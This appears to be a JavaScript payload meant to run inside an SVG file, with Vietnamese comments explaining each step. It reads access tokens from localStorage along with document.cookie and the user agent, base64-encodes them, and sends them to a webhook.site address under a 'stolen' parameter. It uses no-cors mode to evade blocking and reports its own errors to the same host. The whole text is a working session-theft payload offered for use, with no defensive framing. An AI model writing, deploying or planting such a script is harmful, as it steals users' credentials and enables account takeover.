svg.script:
(function() {
    try {
        // 1. Lấy dữ liệu nhạy cảm
        var token = localStorage.getItem('access_token') || localStorage.getItem('token') || 'NoTokenFound';
        var cookie = document.cookie || 'NoCookie';
        var data = "UserAgent: " + navigator.userAgent + " | Token: " + token + " | Cookie: " + cookie;

        // 2. Mã hóa Base64 để tránh lỗi ký tự đặc biệt trên URL
        var encodedData = btoa(data);

        // 3. Gửi dữ liệu về Webhook của bạn
        // Sử dụng mode no-cors để giảm thiểu bị chặn bởi chính sách bảo mật
        fetch('https://webhook.site/bcbf6075-3689-4d51-b21a-7b80b64d082a?stolen=' + encodedData, {
            mode: 'no-cors'
        });
    } catch (e) {
        // Gửi lỗi về nếu script bị crash
        fetch('https://webhook.site/bcbf6075-3689-4d51-b21a-7b80b64d082a?error=' + btoa(e.message));
    }
})();
